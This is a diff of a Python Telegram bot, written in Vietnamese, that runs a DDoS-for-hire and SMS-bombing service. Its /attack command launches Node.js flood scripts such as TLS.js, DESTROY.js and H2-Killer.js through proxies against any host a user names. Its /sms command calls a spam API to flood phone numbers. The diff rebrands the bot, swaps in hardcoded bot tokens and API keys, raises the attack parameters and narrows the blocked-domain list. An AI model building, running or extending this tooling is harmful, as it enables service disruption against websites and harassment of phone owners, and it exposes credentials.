@@ -14,15 +14,15 @@ import io
 import re
 import threading
 
-bot_token = '6371791531:AAGvYLCN2tcVRFhVC9aUaDQoFZxEQ8l0WOg'
+bot_token = '6979848348:AAFWCl7AMqhG_NqL9_jInq3O20qWP_mp1WA'
 
 bot = telebot.TeleBot(bot_token)
 
-allowed_group_id = -1001943835802
+allowed_group_id = -4072480986
 
 allowed_users = []
 processes = []
-ADMIN_ID = 6307427006
+ADMIN_ID = 6864003173
 proxy_update_count = 0
 last_proxy_update_time = time.time()
 key_dict = {}
@@ -94,7 +94,7 @@ def laykey(message):
     print(key)
     
     try:
-        response = requests.get(f'https://web1s.com/api?token=02111506-4571-4103-89ba-d66203d759c0&url=https://anhgit.site/key?key={key}')
+        response = requests.get(f'https://octolinkz.com/api?api=d052a0c886f306e695e3dbbe35e92dd02edb3d41&url=https://leukemic-squeak.000webhostapp.com/key.html?key={key}')
         response_json = response.json()
         if 'shortenedUrl' in response_json:
             url_key = response_json['shortenedUrl']
@@ -114,7 +114,7 @@ def laykey(message):
 @bot.message_handler(commands=['key'])
 def key(message):
     if len(message.text.split()) == 1:
-        bot.reply_to(message, 'Vui Lòng Nhập Key\nVí Dụ /key gioiddos79667\nSử Dụng Lệnh /getkey Để Lấy Key')
+        bot.reply_to(message, 'Vui Lòng Nhập Key\nVí Dụ /key trieuhào91912\nSử Dụng Lệnh /getkey Để Lấy Key')
         return
 
     user_id = message.from_user.id
@@ -134,27 +134,40 @@ def key(message):
 @bot.message_handler(commands=['start', 'help'])
 def help(message):
     help_text = '''
+DDOS - SPAM SMS 🚀
+┏━━━━━━━━━━━━━━
 📌 Tất Cả Các Lệnh:
-1️⃣ Lệnh Lấy Key Và Nhập Key
-- /getkey : Để lấy key
-- /key + [Key] : Kích Hoạt Key
-2️⃣ Lệnh Spam 
-- /sms + [Số Điện Thoại] : Spam VIP
-3️⃣ Lệnh DDoS ( Tấn Công Website )
-- /attack + [methods] + [host]
-- /methods : Để Xem Methods
-- /check + [host] : Kiểm Tra AntiDDoS
-- /proxy : Check Số Lượng Proxy
-4️⃣ Lệnh Có Ích ^^
-- /code + [host] : Lấy Source Code Website
-- /getproxy : Proxy Sẽ Tự Động Update Sau 10 Phút
+┗━━━━━━━━━━━━━━┛
+GET + RUN $ KEY
+┏━━━━━━━━━━━━━━━━━━
+┣➤ /getkey : GET KEY
+┣➤ /key + [Key] : RUN KEY
+┗━━━━━━━━━━━━━━━━━━┛
+SPAM - SMS [ VIP ]
+┏━━━━━━━━━━━━━━━━━━━━━━━━
+┣➤ /sms + [Số Điện Thoại] 
+┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
+DDOS - WEB [ TRUE + VIP ]
+┏━━━━━━━━━━━━━━━━━━
+┣➤ /attack + [METHODS] + [TARGET]
+┣➤ /methods : SHOW METHODS
+┣➤ /check + [host] : CHECK AntiDDoS
+┣➤ /proxy : CHECK PROXY
+┗━━━━━━━━━━━━━━━━━━┛
+TIỆN ÍCH + HỮU DỤNG
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┣➤ /code + [host] : Lấy Source Code Website
+┣➤ /getproxy : Proxy Sẽ Tự Động Update Sau 10 Phút
 [ Proxy Live 95% Die 5 % ]
-- /time : Số Thời Gian Bot Hoạt Động
-5️⃣ Info Admin
-- /muakey : Để Mua Key VIP
-- /admin : Info Admin
-- /on : On Bot
-- /off : Off Bot
+┣➤ /time : Số Thời Gian Bot Hoạt Động
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+INFO - ADMIN :)
+┏━━━━━━━━━━━━━━━━━━
+┣➤ /muakey : BUY KEY VIP
+┣➤ /admin : IF ADMIN
+┣➤ /on : ON BOT 
+┣➤ /off : OFF BOT
+┗━━━━━━━━━━━━━━━━━━┛
 '''
     bot.reply_to(message, help_text)
     
@@ -202,21 +215,29 @@ def attack_command(message):
     url = f"https://api.viduchung.info/spam-sms/?phone={phone_number}"
     response = requests.get(url)
 
-    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Số Tấn Công: {phone_number} \n┣➤ Group: @botgioitool \n┗━━━━━━━━━━━━━━➤')
+    video_url = "liemspam.000webhostapp.com/Gura.mp4"  # Replace this with the actual video URL      
+    message_text =f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @htrlee963  \n┣➤ Số Tấn Công: {phone_number} \n┣➤ Group: @HtrleeCat_bot \n┗━━━━━━━━━━━━━━➤\n'
+    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')
 @bot.message_handler(commands=['methods'])
 def methods(message):
     help_text = '''
-📌 Tất Cả Methods:
-🚀 Layer7 
-[ Không Gov, Edu ]
-TLS
-DESTROY
-CF-BYPASS
-[ Được Pem Gov, Edu]
-GOD 
-🚀 Layer4
-TCP-FLOOD
-UDP-FLOOD
+┏━━━━━━━━━━━━━━━━━━
+┣➤📌 Tất Cả Methods:
+┗━━━━━━━━━━━━━━━━━━┛
+┏━━━━━━━━━━━━━━━━━━
+┣➤🚀 Layer7
+┣➤[ DDOS - VIP ]
+┗━━━━━━━━━━━━━━━━━━┛
+┏━━━━━━━━━━━━━━━━━━
+┣➤TLS
+┣➤DESTROY 
+┣➤FLOOD 
+┣➤GOD
+┣➤BROWSER
+┣➤FISHER
+┣➤KILLER
+┣➤TLSV2
+┗━━━━━━━━━━━━━━━━━━┛
 '''
     bot.reply_to(message, help_text)
 
@@ -260,8 +281,8 @@ def attack_command(message):
     username = message.from_user.username
 
     current_time = time.time()
-    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
-        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
+    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 60:
+        remaining_time = int(60 - (current_time - cooldown_dict[username].get('attack', 0)))
         bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
         return
     
@@ -269,54 +290,46 @@ def attack_command(message):
     method = args[1].upper()
     host = args[2]
 
-    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
-        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attack {method} {host} [port]')
-        return
-
-    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
-        port = args[3]
-    else:
-        port = None
-
-    blocked_domains = [".edu.vn", ".gov.vn", "chinhphu.vn"]   
-    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
+    blocked_domains = ["chinhphu.vn"]   
+    if method == '1' or method == '2' or method == '3':
         for blocked_domain in blocked_domains:
             if blocked_domain in host:
                 bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                 return
 
-    if method in ['TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
+    if method in ['TLS', 'GOD', 'DESTROY', 'FLOOD', 'BROWSER', 'FISHER' , 'KILLER', 'TLSV2']:
         # Update the command and duration based on the selected method
         if method == 'TLS':
-            command = ["node", "TLS.js", host, "90", "64", "5"]
+            command = ["node", "TLS.js", host, "120", "84", "20"]
             duration = 90
         elif method == 'GOD':
-            command = ["node", "GOD.js", host, "45", "64", "3"]
-            duration = 45
+            command = ["node", "GOD.js", host, "120", "84", "20"]
+            duration = 90
         elif method == 'DESTROY':
-            command = ["node", "DESTROY.js", host, "90", "64", "5", "proxy.txt"]
+            command = ["node", "DESTROY.js", host, "200", "120", "30", "proxy.txt"]
             duration = 90
-        elif method == 'CF-BYPASS':
-            command = ["node", "CFBYPASS.js", host, "90", "64", "5", "proxy.txt"]
+        elif method == 'FLOOD':
+            command = ["node", "FLOOD.js", host, "200", "120", "30", "proxy.txt"]
             duration = 90
-        elif method == 'UDP-FLOOD':
-            if not port.isdigit():
-                bot.reply_to(message, 'Port phải là một số nguyên dương.')
-                return
-            command = ["python", "udp.py", host, port, "90", "64", "10"]
+        elif method == 'BROWSER':
+            command = ["node", "brw.js", host, "200", "120", "30", "proxy.txt"]
             duration = 90
-        elif method == 'TCP-FLOOD':
-            if not port.isdigit():
-                bot.reply_to(message, 'Port phải là một số nguyên dương.')
-                return
-            command = ["python", "tcp.py", host, port, "90", "64", "10"]
+        elif method == 'FISHER':
+            command = ["node", "Fisher.js", host, "200", "120", "30", "proxy.txt"]
             duration = 90
-
+        elif method == 'KILLER':
+            command = ["node", "H2-Killer.js", host, "200", "120", "30", "proxy.txt"]
+            duration = 90
+        elif method == 'TLSV2':
+            command = ["node", "tlsv2.js", host, "100", "20", "proxy.txt", "150"]
+            duration = 90
         cooldown_dict[username] = {'attack': current_time}
 
         attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
         attack_thread.start()
-        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Group: @botgioitool \n┗━━━━━━━━━━━━━━➤')
+        video_url = "liemspam.000webhostapp.com/lon.mp4"  # Replace this with the actual video URL      
+        message_text =f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @htrlee963 \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Group: @HtrleeCat_bot  \n┣➤ Admin: Triệu Hào  \n┗━━━━━━━━━━━━━━➤\n'
+        bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')           
     else:
         bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')
 
@@ -452,7 +465,7 @@ def check_ip(message):
 
 @bot.message_handler(commands=['admin'])
 def send_admin_link(message):
-    bot.reply_to(message, "Telegram: t.me/gioihocdev")
+    bot.reply_to(message, "Telegram: t.me/htrlee963")
 @bot.message_handler(commands=['sms'])
 def sms(message):
     pass
@@ -478,13 +491,13 @@ def get_proxy_info(message):
         return
 
     try:
-        with open("proxybynhakhoahoc.txt", "r") as proxy_file:
+        with open("proxyget.txt", "r") as proxy_file:
             proxy_list = proxy_file.readlines()
             proxy_list = [proxy.strip() for proxy in proxy_list]
             proxy_count = len(proxy_list)
             proxy_message = f'10 Phút Tự Update\nSố lượng proxy: {proxy_count}\n'
             bot.send_message(message.chat.id, proxy_message)
-            bot.send_document(message.chat.id, open("proxybynhakhoahoc.txt", "rb"))
+            bot.send_document(message.chat.id, open("proxyget.txt", "rb"))
             proxy_update_count += 1
     except FileNotFoundError:
         bot.reply_to(message, "Không tìm thấy file proxy.txt.")
